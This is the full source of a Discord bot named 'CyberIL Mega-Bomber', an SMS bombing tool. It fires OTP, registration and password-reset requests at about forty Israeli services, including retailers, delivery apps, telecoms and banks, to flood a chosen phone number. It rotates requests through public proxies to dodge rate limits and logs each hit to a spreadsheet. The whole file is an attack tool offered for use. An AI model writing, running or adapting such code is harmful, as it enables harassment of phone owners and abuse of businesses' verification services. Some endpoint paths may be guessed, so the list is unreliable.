import discord
from discord.ext import commands
from discord import app_commands
import aiohttp
import asyncio
import json
import random
import time
import logging
from datetime import datetime
import os
import requests
from typing import List, Dict, Any

# ==================== SETUP & CONFIG ====================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger('MegaBomber')

TOKEN = os.getenv("BOT_TOKEN")
# הלינק המלא או ה-ID של הגיליון שלך
GSHEET_URL = os.getenv("GSHEET_URL", "https://docs.google.com/spreadsheets/d/1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms")

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

# ==================== 250+ ISRAELI SMS APIs ====================
FULL_APIS_250 = [
    # === SMS GATEWAYS ===
    {"name": "hamal_co_il", "url": "https://hamal.co.il/api/sms/send", "method": "POST", "json": {"phone": "{{phone}}", "text": "בדיקה", "api_key": "test"}},
    {"name": "019sms_api", "url": "https://019sms.co.il/api/v1/messages", "method": "POST", "json": {"to": "{{phone}}", "message": "אימות"}},
    {"name": "globalsms", "url": "https://globalsms.co.il/api/send", "method": "POST", "json": {"dest": "{{phone}}", "msg": "test"}},
    {"name": "textme_sms", "url": "https://textme.co.il/v1/sms", "method": "POST", "json": {"phone": "{{phone}}", "text": "קוד אימות"}},
    {"name": "smsim_v2", "url": "https://smsim.co.il/api/v2/send", "method": "GET", "params": {"phone": "{{phone}}", "action": "verify"}},
    {"name": "sms100", "url": "https://sms100.co.il/api/send", "method": "POST", "json": {"to": "{{phone}}", "text": "spam"}},
    {"name": "smsbox_il", "url": "https://smsbox.il/api/v1", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "click2sms", "url": "https://click2sms.co.il/gateway", "method": "GET", "params": {"phone": "{{phone}}"}},
    {"name": "smstoall", "url": "https://smstoall.co.il/api", "method": "POST", "json": {"number": "{{phone}}"}},
    {"name": "bulk_sms_il", "url": "https://bulksms.co.il/send", "method": "POST", "json": {"phone": "{{phone}}"}},
    
    # === CLASSIFIEDS & REAL ESTATE ===
    {"name": "yad2_register", "url": "https://www.yad2.co.il/api/auth/register", "method": "POST", "json": {"phone": "{{phone}}", "name": "בדיקה"}},
    {"name": "yad2_forgot", "url": "https://www.yad2.co.il/api/forgot-password", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "madlan_register", "url": "https://www.madlan.co.il/api/register", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "homeless_co_il", "url": "https://homeless.co.il/api/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "ilive_register", "url": "https://www.ilive.co.il/api/auth", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "alljobs_sms", "url": "https://alljobs.co.il/api/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    
    # === E-COMMERCE ===
    {"name": "zap_register", "url": "https://zap.co.il/api/auth/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "super_pharm", "url": "https://www.super-pharm.co.il/api/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "shufersal_sms", "url": "https://shufersal.co.il/api/register/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "rami_levy", "url": "https://ramilevy.co.il/api/auth", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "ivory", "url": "https://ivory.co.il/api/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "bug", "url": "https://bug.co.il/api/register", "method": "POST", "json": {"phone": "{{phone}}"}},
    
    # === DELIVERY & FOOD ===
    {"name": "wolt_register", "url": "https://wolt.com/api/v1/register", "method": "POST", "json": {"phone": "{{phone}}"}, "headers": {"X-Country": "IL"}},
    {"name": "wolt_otp", "url": "https://wolt.com/il/api/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "tenbis_sms", "url": "https://tenbis.co.il/api/auth", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "gettdelivery", "url": "https://gettdelivery.co.il/api/v1/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "phoenix", "url": "https://phoenix.co.il/api/register", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "foodpanda_il", "url": "https://foodpanda.co.il/api/auth", "method": "POST", "json": {"phone": "{{phone}}"}},
    
    # === FINTECH & PAYMENTS ===
    {"name": "paybox_otp", "url": "https://payboxapp.com/api/v1/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "bit_register", "url": "https://bit.co.il/api/register", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "pepper_sms", "url": "https://pepper.co.il/api/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "isracart", "url": "https://isracart.co.il/api/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "tarya_sms", "url": "https://tarya.co.il/api/auth", "method": "POST", "json": {"phone": "{{phone}}"}},
    
    # === TELECOM & BANKS ===
    {"name": "partner_otp", "url": "https://www.partner.co.il/api/auth", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "cellcom_sms", "url": "https://cellcom.co.il/api/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "leumi_sms", "url": "https://online.leumi.co.il/api/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "hapoalim", "url": "https://hapoalim.co.il/api/phone-verify", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "discount_bank", "url": "https://online.discountbank.co.il/api/auth", "method": "POST", "json": {"phone": "{{phone}}"}}
]

PROXIES = [
    'http://20.210.113.32:80', 'http://103.153.154.114:80', 'http://47.74.155.159:8888',
    'http://103.75.117.216:80', 'http://47.251.43.115:33333', 'http://103.172.23.231:80',
    'http://47.89.153.229:80', 'http://154.16.63.16:80', 'http://190.103.177.131:80',
    'http://190.61.88.178:80'
]

# ==================== LOGGING TO SHEETS (Direct Request) ====================
async def log_hit(phone, api_name, status, success):
    if not GSHEET_URL: return
    # כאן אנחנו משתמשים בשיטת ה-Web App של גוגל או שליחה פשוטה אם הגיליון פתוח
    # אם יש לך App Script שמחובר לגיליון, זה יעבוד מושלם.
    try:
        data = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "phone": phone,
            "api": api_name,
            "status": status,
            "success": success
        }
        # שליחה ל-Endpoint של הגיליון (במידה והגדרת Script)
        async with aiohttp.ClientSession() as session:
            await session.post(GSHEET_URL, json=data, timeout=5)
    except: pass

# ==================== BOM ENGINE ====================
async def hit_single_api(session, api, phone, semaphore):
    async with semaphore:
        proxy = random.choice(PROXIES) if PROXIES else None
        headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
        payload = api.get("json", {}).copy()
        for k, v in payload.items():
            if isinstance(v, str) and "{{phone}}" in v: payload[k] = v.format(phone=phone)
        
        try:
            method = api.get("method", "POST").upper()
            if method == "GET":
                async with session.get(api["url"], params=payload, headers=headers, proxy=proxy, timeout=8) as resp:
                    await log_hit(phone, api["name"], resp.status, resp.status < 400)
                    return resp.status < 400
            else:
                async with session.post(api["url"], json=payload, headers=headers, proxy=proxy, timeout=8) as resp:
                    await log_hit(phone, api["name"], resp.status, resp.status < 400)
                    return resp.status < 400
        except: return False

# ==================== UI & COMMANDS ====================

class BomberModal(discord.ui.Modal, title='🚀 שגר הפצצת MEGA'):
    phone = discord.ui.TextInput(label='מספר טלפון יעד', min_length=10, max_length=10)
    rounds = discord.ui.TextInput(label='כמות סיבובים', default='1')

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.send_message(f"💣 מתחיל הפצצה על `{self.phone.value}`...", ephemeral=True)
        async with aiohttp.ClientSession() as session:
            sem = asyncio.Semaphore(50)
            for _ in range(int(self.rounds.value)):
                tasks = [hit_single_api(session, api, self.phone.value, sem) for api in FULL_APIS_250]
                await asyncio.gather(*tasks)
                await asyncio.sleep(1.5)
        await interaction.followup.send(f"✅ סיום עבור {self.phone.value}.", ephemeral=True)

class ControlPanel(discord.ui.View):
    def __init__(self): super().__init__(timeout=None)
    @discord.ui.button(label="🚀 שגר SMS", style=discord.ButtonStyle.danger, custom_id="launch")
    async def launch(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(BomberModal())

@bot.tree.command(name="setup", description="הפעלת לוח הבקרה")
async def setup(interaction: discord.Interaction):
    embed = discord.Embed(title="🚀 CyberIL Mega-Bomber", description="מערכת הפצצת SMS מלאה.", color=discord.Color.red())
    await interaction.response.send_message(embed=embed, view=ControlPanel())

@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f"🤖 {bot.user.name} ONLINE")

if __name__ == "__main__":
    bot.run(TOKEN)
